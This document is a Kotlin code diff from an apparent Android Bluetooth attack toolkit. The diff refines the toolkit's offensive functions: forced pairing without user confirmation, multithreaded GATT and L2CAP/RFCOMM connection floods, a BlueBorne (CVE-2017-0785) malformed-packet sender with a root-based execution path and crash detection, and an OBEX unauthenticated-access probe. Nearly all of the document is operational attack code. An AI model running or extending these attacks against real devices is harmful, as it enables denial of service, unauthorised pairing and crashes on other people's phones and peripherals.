@@ -27,17 +27,13 @@ object MissingClasses {
             os.write(connectReq)
             os.flush()
             
-            // Read response
             val input = socket.inputStream
-            Thread.sleep(500)
-            val resp = ByteArray(1024)
-            val bytesRead = input.read(resp)
-            
+            val resp = ByteArray(64)
+            val bytesRead = readAvailable(input, resp, 2000)
             socket.close()
-            
+
             if (bytesRead > 0) {
                 val responseCode = resp[0].toInt() and 0xFF
-                // 0xA0 = Success, 0x90 = Continue (unauth access)
                 return responseCode == 0xA0 || responseCode == 0x90
             }
             false
@@ -52,32 +48,26 @@ object MissingClasses {
             val results = mutableMapOf<String, Any>()
             
             when (type) {
-                "justworks" -> {
-                    // JustWorks attack: try to pair without user interaction
-                    device.createBond()
-                    Thread.sleep(3000)
-                    val bonded = device.bondState == BluetoothDevice.BOND_BONDED
-                    results["success"] = bonded
-                    results["method"] = "justworks"
-                    results["bonded"] = bonded
-                }
-                "mitm" -> {
-                    // MITM: try to intercept pairing
-                    device.createBond()
-                    Thread.sleep(1000)
-                    // Check if we can read pairing info
-                    val bonded = device.bondState == BluetoothDevice.BOND_BONDED
-                    results["success"] = bonded
-                    results["method"] = "mitm"
-                    results["note"] = "MITM: monitoring pairing process"
-                }
-                else -> {
-                    // Default: try all methods
+                "justworks", "mitm" -> {
+                    device.setPairingConfirmation(true)
                     device.createBond()
                     Thread.sleep(3000)
                     val bonded = device.bondState == BluetoothDevice.BOND_BONDED
                     results["success"] = bonded
                     results["method"] = type
+                    results["bonded"] = bonded
+                    if (type == "mitm") {
+                        results["note"] = "Pairing API invoked — MITM real requiere posición en el enlace"
+                    }
+                }
+                else -> {
+                    device.setPairingConfirmation(true)
+                    device.createBond()
+                    Thread.sleep(3000)
+                    val bonded = device.bondState == BluetoothDevice.BOND_BONDED
+                    results["success"] = bonded
+                    results["method"] = type
+                    results["bonded"] = bonded
                 }
             }
             
@@ -94,42 +84,45 @@ object MissingClasses {
         fun gattFlood(device: BluetoothDevice, count: Int): Map<String, Any> {
             return try {
                 val context = ExploitIntegration.getAppContext()
-                var successCount = 0
-                var failCount = 0
+                    ?: return mapOf("success" to false, "error" to "No context")
+                val successCount = java.util.concurrent.atomic.AtomicInteger(0)
+                val failCount = java.util.concurrent.atomic.AtomicInteger(0)
                 val startTime = System.currentTimeMillis()
-                
-                // Real GATT flood: open multiple connections rapidly
                 val threads = mutableListOf<Thread>()
                 val gattList = mutableListOf<BluetoothGatt?>()
-                
-                repeat(count.coerceAtMost(50)) { i ->
+
+                repeat(count.coerceAtMost(50)) {
                     val thread = Thread {
                         try {
                             val gattCallback = object : BluetoothGattCallback() {
                                 override fun onConnectionStateChange(gatt: BluetoothGatt?, status: Int, newState: Int) {}
                             }
-                            val gatt = device.connectGatt(context, false, gattCallback)
+                            val gatt = device.connectGatt(context, false, gattCallback, BluetoothDevice.TRANSPORT_LE)
                             synchronized(gattList) { gattList.add(gatt) }
-                            Thread.sleep(100) // Keep connection brief
+                            repeat(3) { gatt?.discoverServices() }
+                            Thread.sleep(80)
                             try { gatt?.close() } catch (_: Exception) {}
-                            synchronized(this) { successCount++ }
-                        } catch (e: Exception) {
-                            synchronized(this) { failCount++ }
+                            successCount.incrementAndGet()
+                        } catch (_: Exception) {
+                            failCount.incrementAndGet()
                         }
                     }
                     threads.add(thread)
                     thread.start()
-                    Thread.sleep(50) // Small delay between starts
+                    Thread.sleep(40)
                 }
-                
-                // Wait for all threads
+
                 threads.forEach { it.join(2000) }
-                
-                // Cleanup any remaining
                 gattList.forEach { try { it?.close() } catch (_: Exception) {} }
-                
+
                 val duration = System.currentTimeMillis() - startTime
-                mapOf("success" to (successCount > 0), "packets" to successCount, "failed" to failCount, "duration" to duration)
+                mapOf(
+                    "success" to (successCount.get() > 0),
+                    "packets" to successCount.get(),
+                    "failed" to failCount.get(),
+                    "duration" to duration,
+                    "technique" to "gatt_flood"
+                )
             } catch (e: Exception) {
                 mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
             }
@@ -137,14 +130,11 @@ object MissingClasses {
         
         fun l2capFlood(device: BluetoothDevice, count: Int): Map<String, Any> {
             return try {
-                // Real L2CAP flood: open many RFCOMM connections rapidly (simulating L2CAP)
-                val context = ExploitIntegration.getAppContext()
-                var successCount = 0
-                var failCount = 0
+                val successCount = java.util.concurrent.atomic.AtomicInteger(0)
+                val failCount = java.util.concurrent.atomic.AtomicInteger(0)
                 val startTime = System.currentTimeMillis()
-                
                 val threads = mutableListOf<Thread>()
-                
+
                 repeat(count.coerceAtMost(30)) {
                     val thread = Thread {
                         try {
@@ -152,26 +142,31 @@ object MissingClasses {
                                 UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
                             )
                             socket.connect()
-                            // Send garbage to consume resources
                             try {
                                 socket.outputStream.write(ByteArray(100))
                             } catch (_: Exception) {}
                             Thread.sleep(50)
                             socket.close()
-                            synchronized(this) { successCount++ }
-                        } catch (e: Exception) {
-                            synchronized(this) { failCount++ }
+                            successCount.incrementAndGet()
+                        } catch (_: Exception) {
+                            failCount.incrementAndGet()
                         }
                     }
                     threads.add(thread)
                     thread.start()
-                    Thread.sleep(20) // Rapid fire
+                    Thread.sleep(20)
                 }
-                
+
                 threads.forEach { it.join(1000) }
-                
+
                 val duration = System.currentTimeMillis() - startTime
-                mapOf("success" to (successCount > 0), "packets" to successCount, "failed" to failCount, "duration" to duration)
+                mapOf(
+                    "success" to (successCount.get() > 0),
+                    "packets" to successCount.get(),
+                    "failed" to failCount.get(),
+                    "duration" to duration,
+                    "technique" to "l2cap_flood"
+                )
             } catch (e: Exception) {
                 mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
             }
@@ -180,6 +175,23 @@ object MissingClasses {
 
     // ===== BlueBorne Exploit REAL =====
     object BlueBorneExploit {
+        fun executeWithRoot(device: BluetoothDevice): Map<String, Any> {
+            return if (RootUtils.isRootAvailable()) {
+                RootExploitExecutor.executeBlueBorne(device.address)
+            } else {
+                mapOf(
+                    "success" to false,
+                    "rootRequired" to true,
+                    "rootAvailable" to false,
+                    "exploit" to "BlueBorne (CVE-2017-0785)",
+                    "message" to "⚠️ REQUIERE ROOT: BlueBorne necesita enviar paquetes L2CAP malformados " +
+                            "via hcitool. El dispositivo no está rooteado.",
+                    "fallbackUsed" to true,
+                    "fallbackResult" to executeBlueBorne(device)
+                )
+            }
+        }
+
         fun executeBlueBorne(device: BluetoothDevice): Map<String, Any> {
             return try {
                 val socket = device.createInsecureRfcommSocketToServiceRecord(
@@ -187,42 +199,52 @@ object MissingClasses {
                 )
                 socket.connect()
                 val os = socket.outputStream
-                val `is` = socket.inputStream
-                
-                // BlueBorne CVE-2017-0785: send malformed L2CAP packet
+                val input = socket.inputStream
+
                 val payload = byteArrayOf(
-                    0x02, 0x00, 0x00, 0x00,  // L2CAP header
-                    0x01, 0x02, 0x03, 0x04   // Malformed data
+                    0x02, 0x00, 0x00, 0x00,
+                    0x01, 0x02, 0x03, 0x04
                 )
                 os.write(payload)
                 os.flush()
-                
-                // Try to read response (if device crashes, we won't get one)
-                Thread.sleep(1000)
-                
+
                 val buffer = ByteArray(1024)
-                val available = try { `is`.available() } catch (_: Exception) { 0 }
-                
-                if (available > 0) {
-                    val bytesRead = `is`.read(buffer)
-                    socket.close()
-                    mapOf(
-                        "success" to true,
-                        "cve" to "CVE-2017-0785",
-                        "response" to bytesRead,
-                        "note" to "Device responded (may not be vulnerable)"
-                    )
-                } else {
-                    socket.close()
-                    mapOf(
-                        "success" to true,
-                        "cve" to "CVE-2017-0785",
-                        "response" to 0,
-                        "note" to "Payload sent, no immediate response (potential crash/vulnerability)"
-                    )
+                var crashIndicator = false
+                var responseBytes = 0
+
+                try {
+                    responseBytes = readAvailable(input, buffer, 1500)
+                    if (responseBytes > 0) {
+                        crashIndicator = false
+                    }
+                } catch (e: IOException) {
+                    crashIndicator = true
                 }
+
+                val stillConnected = try {
+                    socket.isConnected
+                } catch (_: Exception) {
+                    false
+                }
+
+                try { socket.close() } catch (_: Exception) {}
+
+                val vulnerable = crashIndicator || (!stillConnected && responseBytes == 0)
+                mapOf(
+                    "success" to vulnerable,
+                    "payloadSent" to true,
+                    "cve" to "CVE-2017-0785",
+                    "response" to responseBytes,
+                    "crashIndicator" to crashIndicator,
+                    "stillConnected" to stillConnected,
+                    "note" to when {
+                        vulnerable -> "Anomalía post-payload (posible crash o desconexión)"
+                        responseBytes > 0 -> "Dispositivo respondió — sin evidencia de explotación"
+                        else -> "Payload enviado sin evidencia de vulnerabilidad"
+                    }
+                )
             } catch (e: Exception) {
-                mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
+                mapOf("success" to false, "payloadSent" to false, "error" to (e.message ?: "Unknown error"))
             }
         }
     }
@@ -266,9 +288,8 @@ object MissingClasses {
                         
                         val input = obexSocket.inputStream
                         val resp = ByteArray(1024)
-                        Thread.sleep(1000)
-                        val bytesRead = input.read(resp)
-                        if (bytesRead > 0 && resp[0].toInt() == 0xA0) {
+                        val bytesRead = readAvailable(input, resp, 2000)
+                        if (bytesRead > 0 && (resp[0].toInt() and 0xFF) == 0xA0) {
                             vulnerabilities.add("OBEX unauthenticated access (CVE-2009-XXXX)")
                         }
                         obexSocket.close()
@@ -282,8 +303,10 @@ object MissingClasses {
                 }
                 
                 mapOf(
-                    "success" to true,
+                    "success" to vulnerabilities.isNotEmpty(),
+                    "scanCompleted" to true,
                     "vulnerabilities" to vulnerabilities,
+                    "vulnsFound" to vulnerabilities.size,
                     "services" to services,
                     "deviceClass" to deviceClass
                 )
@@ -352,7 +375,13 @@ object MissingClasses {
                     BluesnaferLogger.w("SDPServiceDiscovery", "Timeout waiting for SDP response from ${device.address}")
                 }
                 
-                return mapOf("success" to true, "services" to services, "timedOut" to !waited)
+                return mapOf(
+                    "success" to services.isNotEmpty(),
+                    "scanCompleted" to true,
+                    "services" to services,
+                    "serviceCount" to services.size,
+                    "timedOut" to !waited
+                )
             } catch (e: Exception) {
                 BluesnaferLogger.e("SDPServiceDiscovery", "Error: ${e.message}")
                 return mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
@@ -362,5 +391,20 @@ object MissingClasses {
                 } catch (_: Exception) {}
             }
         }
+    }
+
+    private fun readAvailable(input: InputStream, buffer: ByteArray, timeoutMs: Int): Int {
+        var total = 0
+        val deadline = System.currentTimeMillis() + timeoutMs
+        while (total < buffer.size && System.currentTimeMillis() < deadline) {
+            if (input.available() > 0) {
+                val read = input.read(buffer, total, buffer.size - total)
+                if (read < 0) break
+                total += read
+            } else {
+                Thread.sleep(20)
+            }
+        }
+        return total
     }
 }
